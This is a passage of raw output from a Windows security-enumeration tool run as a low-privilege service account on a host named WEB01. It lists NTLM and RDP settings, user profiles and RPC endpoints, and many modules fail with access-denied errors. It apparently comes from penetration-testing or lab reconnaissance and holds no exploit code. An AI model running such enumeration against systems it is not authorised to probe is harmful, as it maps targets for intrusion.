   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.NetworkSharesCommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== NTLMSettings ======

  LanmanCompatibilityLevel    : (Send NTLMv2 response only - Win7+ default)

  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : 1 (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require128BitKey)
      NTLMMinServerSec        : 536870912 (Require128BitKey)


  NTLM Auditing and Restrictions
      InboundRestrictions     : (Not defined)
      OutboundRestrictions    : (Not defined)
      InboundAuditing         : (Not defined)
      OutboundExceptions      :
====== OfficeMRUs ======

Enumerating Office most recently used files for the last 7 days

  App       User                     LastAccess    FileName
  ---       ----                     ----------    --------
====== OneNote ======


    OneNote files (Administrator):



    OneNote files (Administrator.DAEDALUS):



    OneNote files (billing_user):



    OneNote files (MSSQLSERVER):



    OneNote files (SQLSERVERAGENT):



    OneNote files (SQLTELEMETRY):



    OneNote files (svc_backup):



    OneNote files (svc_dev):


====== OptionalFeatures ======

ERROR:   [!] Terminating exception running command 'OptionalFeatures': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.OptionalFeaturesCommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== OracleSQLDeveloper ======

====== OSInfo ======

ERROR:   [!] Terminating exception running command 'OSInfo': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.OSInfoCommand.IsVirtualMachine()
   at AnschnallGurt.Commands.Windows.OSInfoCommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== OutlookDownloads ======

====== PoweredOnEvents ======

Collecting kernel boot (EID 12) and shutdown (EID 13) events from the last 7 days

Powered On Events (Time is local time)
ERROR:   [!] Terminating exception running command 'PoweredOnEvents': System.UnauthorizedAccessException: Attempted to perform an unauthorized operation.
   at System.Diagnostics.Eventing.Reader.EventLogException.Throw(Int32 errorCode)
   at System.Diagnostics.Eventing.Reader.NativeWrapper.EvtQuery(EventLogHandle session, String path, String query, Int32 flags)
   at System.Diagnostics.Eventing.Reader.EventLogReader..ctor(EventLogQuery eventQuery, EventBookmark bookmark)
   at AnschnallGurt.Runtime.GetEventLogReader(String path, String query)
   at AnschnallGurt.Commands.Windows.EventLogs.PoweredOnEventsCommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== PowerShell ======

ERROR:   [!] Terminating exception running command 'PowerShell': System.FormatException: Input string was not in a correct format.
   at System.Number.StringToNumber(String str, NumberStyles options, NumberBuffer& number, NumberFormatInfo info, Boolean parseDecimal)
   at System.Number.ParseInt32(String s, NumberStyles style, NumberFormatInfo info)
   at AnschnallGurt.Commands.Windows.PowerShellCommand.<Execute>d__14.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== PowerShellEvents ======

Searching script block logs (EID 4104) for sensitive data.

ERROR:   [!] Terminating exception running command 'PowerShellEvents': System.UnauthorizedAccessException: Attempted to perform an unauthorized operation.
   at System.Diagnostics.Eventing.Reader.EventLogException.Throw(Int32 errorCode)
   at System.Diagnostics.Eventing.Reader.NativeWrapper.EvtQuery(EventLogHandle session, String path, String query, Int32 flags)
   at System.Diagnostics.Eventing.Reader.EventLogReader..ctor(EventLogQuery eventQuery, EventBookmark bookmark)
   at AnschnallGurt.Runtime.GetEventLogReader(String path, String query)
   at AnschnallGurt.Commands.Windows.EventLogs.PowerShellEventsCommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== PowerShellHistory ======

====== Printers ======

ERROR:   [!] Terminating exception running command 'Printers': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.PrintersCommand.<Execute>d__9.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== ProcessCreationEvents ======

ERROR: Unable to collect. Must be an administrator.
====== Processes ======

Collecting Non Microsoft Processes (via WMI)

ERROR:   [!] Terminating exception running command 'Processes': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.ProcessesCommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== ProcessOwners ======

ERROR:   [!] Terminating exception running command 'ProcessOwners': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.ProcessesOwnerCommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== PSSessionSettings ======

ERROR: Unable to collect. Must be an administrator.
====== PuttyHostKeys ======

====== PuttySessions ======

====== RDCManFiles ======

====== RDPSavedConnections ======

====== RDPSessions ======

  SessionID                     :  1
  SessionName                   :  Console
  UserName                      :  WEB01\svc_dev
  State                         :  Active
  HostName                      :
  FarmName                      :
  LastInput                     :  16h:56m:41s:811ms
  ClientIP                      :
  ClientHostname                :
  ClientResolution              :  640x480 @ 2 bits per pixel
  ClientBuild                   :  0
  ClientHardwareId              :  0,0,0,0
  ClientDirectory               :

====== RDPsettings ======

RDP Server Settings:
  NetworkLevelAuthentication:
  BlockClipboardRedirection:
  BlockComPortRedirection:
  BlockDriveRedirection:
  BlockLptPortRedirection:
  BlockPnPDeviceRedirection:
  BlockPrinterRedirection:
  AllowSmartCardRedirection:

RDP Client Settings:
  DisablePasswordSaving: True
  RestrictedRemoteAdministration: False
====== RecycleBin ======

Recycle Bin Files Within the last 30 Days

====== reg ======

HKLM\Software ! (default) :
HKLM\Software\Classes ! (default) :
HKLM\Software\Clients ! (default) :
HKLM\Software\DefaultUserEnvironment ! (default) :
HKLM\Software\dotnet ! (default) :
HKLM\Software\Google ! (default) :
HKLM\Software\Intel ! (default) :
HKLM\Software\Microsoft ! (default) :
HKLM\Software\Mozilla ! (default) :
HKLM\Software\ODBC ! (default) :
HKLM\Software\OpenSSH ! (default) :
HKLM\Software\Partner ! (default) :
HKLM\Software\Policies ! (default) :
HKLM\Software\RegisteredApplications ! (default) :
HKLM\Software\Setup ! (default) :
HKLM\Software\VMware, Inc. ! (default) :
HKLM\Software\WOW6432Node ! (default) :
====== RPCMappedEndpoints ======

  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncacn_ip_tcp:[49664]
  a111f1c5-5923-47c0-9a68-d0bafb577901 v1.0 (NetSetup API): ncalrpc:[LRPC-bd59110374f12b2efe]
  0497b57d-2e66-424f-a0c6-157cd5d41700 v1.0 (AppInfo): ncalrpc:[LRPC-9d5a340abda7c546c3]
  201ef99a-7fa0-444c-9399-19ba84f12a1a v1.0 (AppInfo): ncalrpc:[LRPC-9d5a340abda7c546c3]
  5f54ce7d-5b79-4175-8584-cb65313a0e98 v1.0 (AppInfo): ncalrpc:[LRPC-9d5a340abda7c546c3]
  fd7a0523-dc70-43dd-9b2e-9c5ed48225b1 v1.0 (AppInfo): ncalrpc:[LRPC-9d5a340abda7c546c3]
  58e604e8-9adb-4d2e-a464-3b0683fb1480 v1.0 (AppInfo): ncalrpc:[LRPC-9d5a340abda7c546c3]
  0767a036-0d22-48aa-ba69-b619480f38cb v1.0 (PcaSvc): ncalrpc:[LRPC-84c57d3250a10121cf]
  be7f785e-0e3a-4ab7-91de-7e46e443be29 v0.0 (): ncalrpc:[LRPC-d2e84234ecb17e9bfe]
  54b4c689-969a-476f-8dc2-990885e9f562 v0.0 (): ncalrpc:[LRPC-d2e84234ecb17e9bfe]
  bf4dc912-e52f-4904-8ebe-9317c1bdd497 v1.0 (): ncalrpc:[OLE7F1AF5383646BA8F0988E73D47D3]
  bf4dc912-e52f-4904-8ebe-9317c1bdd497 v1.0 (): ncalrpc:[LRPC-f2270e037c72278aa3]
  a4b8d482-80ce-40d6-934d-b22a01a44fe7 v1.0 (LicenseManager): ncalrpc:[LicenseServiceEndpoint]
  8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 (): ncalrpc:[OLE2BA9286D528550339FC28A20FAEE]
  8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 (): ncalrpc:[LRPC-3472ecdc428f3a6693]
  0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 (): ncalrpc:[OLE2BA9286D528550339FC28A20FAEE]
  0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 (): ncalrpc:[LRPC-3472ecdc428f3a6693]
  b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 (): ncalrpc:[OLE2BA9286D528550339FC28A20FAEE]
  b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 (): ncalrpc:[LRPC-3472ecdc428f3a6693]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WMsgKRpc0B1AE1]
  12e65dd8-887f-41ef-91bf-8d816c42c2e7 v1.0 (Secure Desktop LRPC interface): ncalrpc:[WMsgKRpc0B1AE1]
  367abb81-9844-35f1-ad32-98f038001003 v2.0 (): ncacn_ip_tcp:[49713]
  4c9dbf19-d39e-4bb9-90ee-8f7179b20283 v1.0 (): ncalrpc:[LRPC-ba7ce48e77f518a7d7]
  fd8be72b-a9cd-4b2c-a9ca-4ded242fbe4d v1.0 (): ncalrpc:[LRPC-ba7ce48e77f518a7d7]
  95095ec8-32ea-4eb0-a3e2-041f97b36168 v1.0 (): ncalrpc:[LRPC-ba7ce48e77f518a7d7]
  e38f5360-8572-473e-b696-1b46873beeab v1.0 (): ncalrpc:[LRPC-ba7ce48e77f518a7d7]
  d22895ef-aff4-42c5-a5b2-b14466d34ab4 v1.0 (): ncalrpc:[LRPC-ba7ce48e77f518a7d7]
  98cd761e-e77d-41c8-a3c0-0fb756d90ec2 v1.0 (): ncalrpc:[LRPC-ba7ce48e77f518a7d7]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncacn_np:[\\PIPE\\ROUTER]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncalrpc:[RasmanLrpc]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncalrpc:[VpnikeRpc]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncalrpc:[LRPC-00554c760bc4b877ba]
  2f5f6521-cb55-1059-b446-00df0bce31db v1.0 (Unimodem LRPC Endpoint): ncacn_np:[\\pipe\\tapsrv]
  2f5f6521-cb55-1059-b446-00df0bce31db v1.0 (Unimodem LRPC Endpoint): ncalrpc:[tapsrvlpc]
  2f5f6521-cb55-1059-b446-00df0bce31db v1.0 (Unimodem LRPC Endpoint): ncalrpc:[unimdmsvc]
  b18fbab6-56f8-4702-84e0-41053293a869 v1.0 (UserMgrCli): ncalrpc:[OLE2D41034F0E900619C994E8A535BC]
  b18fbab6-56f8-4702-84e0-41053293a869 v1.0 (UserMgrCli): ncalrpc:[LRPC-2162a53e6b394bd20c]
  0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 (UserMgrCli): ncalrpc:[OLE2D41034F0E900619C994E8A535BC]
  0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 (UserMgrCli): ncalrpc:[LRPC-2162a53e6b394bd20c]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-3203df20e0a5a50cd4]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-3203df20e0a5a50cd4]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-3203df20e0a5a50cd4]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[OLE4982F1D78F5C1D52D43CCD16ABF1]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-3e727111ad0aec0d0c]
  4b112204-0e19-11d3-b42b-0000f81feb9f v1.0 (): ncalrpc:[LRPC-7193eecd165f1b5f6d]
  98716d03-89ac-44c7-bb8c-285824e51c4a v1.0 (XactSrv service): ncalrpc:[LRPC-d9293d5a54719eb925]
  1a0d010f-1c33-432c-b0f5-8cf4e8053099 v1.0 (IdSegSrv service): ncalrpc:[LRPC-d9293d5a54719eb925]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-99b9549307f8fb9fc1]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncalrpc:[LRPC-99b9549307f8fb9fc1]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncalrpc:[SessEnvPrivateRpc]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncacn_np:[\\pipe\\SessEnvPublicRpc]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncacn_ip_tcp:[49668]
  30b044a5-a225-43f0-b3a4-e060df91f9c1 v1.0 (): ncalrpc:[LRPC-805e2c97d53567f53d]
  a398e520-d59a-4bdd-aa7a-3c1e0303a511 v1.0 (IKE/Authip API): ncalrpc:[LRPC-ec13fb86191e78b2d6]
  b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 (): ncalrpc:[LRPC-4a7118fb23d1078518]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncacn_np:[\\pipe\\lsass]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[audit]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[securityevent]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSARPC_ENDPOINT]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsacap]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSA_EAS_ENDPOINT]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsapolicylookup]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsasspirpc]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[protected_storage]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[SidKey Local End Point]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[samss lpc]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[NETLOGON_LRPC]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncacn_np:[\\pipe\\lsass]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[audit]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[securityevent]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSARPC_ENDPOINT]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsacap]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_EAS_ENDPOINT]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsapolicylookup]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsasspirpc]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[protected_storage]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[SidKey Local End Point]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[samss lpc]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[NETLOGON_LRPC]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncacn_np:[\\pipe\\lsass]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[audit]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[securityevent]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSARPC_ENDPOINT]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsacap]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_EAS_ENDPOINT]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsapolicylookup]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsasspirpc]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[protected_storage]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[SidKey Local End Point]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[samss lpc]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[NETLOGON_LRPC]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_np:[\\pipe\\lsass]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[audit]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[securityevent]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSARPC_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsacap]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_EAS_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsapolicylookup]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsasspirpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[protected_storage]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[SidKey Local End Point]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[samss lpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[NETLOGON_LRPC]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49667]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_np:[\\pipe\\lsass]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[audit]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[securityevent]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSARPC_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsacap]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_EAS_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsapolicylookup]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsasspirpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[protected_storage]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[SidKey Local End Point]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[samss lpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[NETLOGON_LRPC]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49667]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncacn_np:[\\pipe\\lsass]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[audit]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[securityevent]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSARPC_ENDPOINT]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsacap]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSA_EAS_ENDPOINT]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsapolicylookup]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsasspirpc]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[protected_storage]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[SidKey Local End Point]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[samss lpc]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[NETLOGON_LRPC]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncacn_ip_tcp:[49667]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncacn_ip_tcp:[49669]
  552d076a-cb29-4e44-8b6a-d15e59e2c0af v1.0 (IP Transition Configuration endpoint): ncalrpc:[LRPC-ca5162c0af95019a44]
  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[LRPC-ca5162c0af95019a44]
  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[TeredoDiagnostics]
  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[TeredoControl]
  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[LRPC-ca5162c0af95019a44]
  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[TeredoDiagnostics]
  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[TeredoControl]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[LRPC-ca5162c0af95019a44]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[TeredoDiagnostics]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[TeredoControl]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[OLEE77011E269DCE51DD2E4F924FAD1]
  abfb6ca3-0c5e-4734-9285-0aee72fe8d1c v1.0 (): ncalrpc:[OLE19D6877DFD883D501D105585174A]
  abfb6ca3-0c5e-4734-9285-0aee72fe8d1c v1.0 (): ncalrpc:[LRPC-b13ecd852a899d0da8]
  b37f900a-eae4-4304-a2ab-12bb668c0188 v1.0 (): ncalrpc:[OLE19D6877DFD883D501D105585174A]
  b37f900a-eae4-4304-a2ab-12bb668c0188 v1.0 (): ncalrpc:[LRPC-b13ecd852a899d0da8]
  e7f76134-9ef5-4949-a2d6-3368cc0988f3 v1.0 (): ncalrpc:[OLE19D6877DFD883D501D105585174A]
  e7f76134-9ef5-4949-a2d6-3368cc0988f3 v1.0 (): ncalrpc:[LRPC-b13ecd852a899d0da8]
  7aeb6705-3ae6-471a-882d-f39c109edc12 v1.0 (): ncalrpc:[OLE19D6877DFD883D501D105585174A]
  7aeb6705-3ae6-471a-882d-f39c109edc12 v1.0 (): ncalrpc:[LRPC-b13ecd852a899d0da8]
  f44e62af-dab1-44c2-8013-049a9de417d6 v1.0 (): ncalrpc:[OLE19D6877DFD883D501D105585174A]
  f44e62af-dab1-44c2-8013-049a9de417d6 v1.0 (): ncalrpc:[LRPC-b13ecd852a899d0da8]
  c2d1b5dd-fa81-4460-9dd6-e7658b85454b v1.0 (): ncalrpc:[OLE19D6877DFD883D501D105585174A]
  c2d1b5dd-fa81-4460-9dd6-e7658b85454b v1.0 (): ncalrpc:[LRPC-b13ecd852a899d0da8]
  f2c9b409-c1c9-4100-8639-d8ab1486694a v1.0 (Witness Client Upcall Server): ncalrpc:[LRPC-ccd647ec1114a89cba]
  eb081a0d-10ee-478a-a1dd-50995283e7a8 v3.0 (Witness Client Test Interface): ncalrpc:[LRPC-ccd647ec1114a89cba]
  7f1343fe-50a9-4927-a778-0c5859517bac v1.0 (DfsDs service): ncalrpc:[LRPC-ccd647ec1114a89cba]
  7f1343fe-50a9-4927-a778-0c5859517bac v1.0 (DfsDs service): ncacn_np:[\\PIPE\\wkssvc]
  3473dd4d-2e88-4006-9cba-22570909dd10 v5.1 (WinHttp Auto-Proxy Service): ncalrpc:[LRPC-341d8e2deb6a697a50]
  3473dd4d-2e88-4006-9cba-22570909dd10 v5.1 (WinHttp Auto-Proxy Service): ncalrpc:[b430042b-ec33-418e-b121-06b140a96af4]
  dd490425-5325-4565-b774-7e27d6c09c24 v1.0 (Base Firewall Engine API): ncalrpc:[LRPC-60b5ee9cad5367edf2]
